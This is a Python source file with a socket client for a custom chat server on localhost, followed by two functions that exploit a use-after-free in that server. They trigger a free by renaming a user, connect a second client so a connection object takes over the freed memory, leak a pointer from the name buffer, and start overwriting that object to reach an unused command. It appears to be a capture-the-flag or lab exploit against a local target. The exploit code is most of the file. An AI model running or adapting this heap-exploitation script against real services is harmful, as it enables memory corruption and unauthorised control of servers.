import time
from socket import *
import struct
import threading

MSG_SIZE = 1024

class pythonAgent:
    def __init__(self, server):
        self._server = server
        self._sock = socket(AF_INET, SOCK_STREAM, 0)

    def connect(self, username):
        self._sock.connect(self._server)
        self.put_new_name(username)

    def get_response(self):
        response = self._sock.recv(MSG_SIZE)
        # print("response:", response)
        cmd = response[:8].replace(b'\0', b'')
        message = response[12:]
        return cmd, message

    def request(self, command, message):
        packet = command.ljust(8, b'\0')
        packet += struct.pack('<L', len(message))
        packet += message

        # print("packet: ", packet)

        self._sock.send(packet)

    def put_new_name(self, username):
        self.request(b'NEWNAME', username)
        r = self.get_response()
        # print(r)
        # if b"invalid" not in r[1] and r[1] != username:
        #     input("different!: {} != {}\n".format(r[1], username))

    def read_name(self):
        self.request(b'READNAM', b'')
        return self.get_response()

    def not_used1(self):
        self.request(b'NOTUSED', b'')
        return self.get_response()

    def not_used2(self):
        self.request(b'NOUSED2', b'')
        return self.get_response()

    def send_message_to_server(self, message):
        self.request(b'TOSERVR', message)
        # cmd, message = self.get_response(self._sock.recv(MSG_SIZE))

    def get_message(self):
        while True:
            print(self.get_response())
            #print
            #if cmd == b'TOSERVR':
                #print(message)

    def close(self):
        self._sock.close()


if __name__ == '__main__':
    ip = "127.0.0.1"
    port = 333
    server = (ip, port)

    client = pythonAgent(server)
    username = raw_input("Enter your username: ")
    client.connect(username=username)

    message_thread = threading.Thread(target=client.get_message, args=())
    message_thread.daemon = True
    message_thread.start()

    while True:
        message = raw_input("")
        client.send_message_to_server(message)

import struct 


def crazy():
    p = pythonAgent(("127.0.0.1", 333))
    p.connect(b"b"*24)

    while True:
        agents = []

        for x in range(30):
            p.put_new_name(b"b"*100)
            a = pythonAgent(("127.0.0.1", 333))
            a.connect(b"user")
            print("++++++++++++++++++++++++++++++++++++++++++++++")
            name = p.read_name()[1]
            print(name)
            addr = struct.unpack("<I", name[:4])[0]
            if addr == 0x96581c:
                import pdb;pdb.set_trace()
            # print("address: {}".format(hex(addr)))
            print("++++++++++++++++++++++++++++++++++++++++++++++")
            agents.append(a)
            # name = p.read_name()[1]
            # print("----------------------------------------------")
            # print(p.read_name()[1])
            # print("----------------------------------------------")
            # p.put_new_name(b"\x00"*24)
            # a.send_message_to_server(b"testers")
            # p.get_response()
            # time.sleep(0.1)

        for a in agents:
            a.close()

def poop():
    p = pythonAgent(("127.0.0.1", 333))
    p.connect(b"a"*24)

    # Repeat until lucky :)
    while True:

        # Trigger free
        p.put_new_name(b"b"*100) 

        # Connect new user
        p2 = pythonAgent(("127.0.0.1", 333))
        p2.connect(b"user")

        name = p.read_name()[1]
        
        addr = struct.unpack("<I", name[:4])[0]

        # Someone overwrote our name
        if name != "a"*24:
            # It's a connection object
            if addr == 0x96581c:
                return p,p2
                name = name[:12] + b'\x01' + name[13:]
                assert len(name) == 24
                p.put_new_name(name)
                return p2.not_used1()
            else:
                print(hex(addr))
                p.close()
                p = pythonAgent(("127.0.0.1", 333))
                p.connect(b"a"*24)
